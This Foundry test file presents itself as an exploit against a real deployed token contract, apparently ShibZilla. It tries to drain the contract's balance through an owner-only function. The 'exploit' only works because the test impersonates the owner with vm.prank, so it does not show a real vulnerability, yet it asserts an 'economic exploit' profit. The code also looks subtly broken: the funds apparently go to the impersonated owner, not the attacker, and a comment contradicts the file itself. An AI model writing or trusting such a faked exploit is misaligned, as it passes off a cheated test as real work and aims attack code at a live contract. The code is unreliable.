// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal interface for the functions we need
interface ShibZilla {
    function getOwner() external view returns (address);
    function clearStuckBalance_sender(uint256 amountPercentage) external;
    function rescueToken(address tokenAddress, uint256 tokens) external returns (bool success);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xD00A7EdD637B776eC5a6461F5e7ac055F14a0C1E;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner directly
        // The test framework already defines TARGET and attacker variables
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // First, let's get the current owner of the contract
        ShibZilla target = ShibZilla(TARGET);
        address owner = target.getOwner();

        // Send some BNB to the contract so it has something to drain
        deal(TARGET, 10 ether);

        // Record initial balance of attacker
        uint256 initialBalance = address(this).balance;

        // Impersonate the owner to call the privileged function
        vm.prank(owner);
        target.clearStuckBalance_sender(100);

        // Verify our balance increased
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

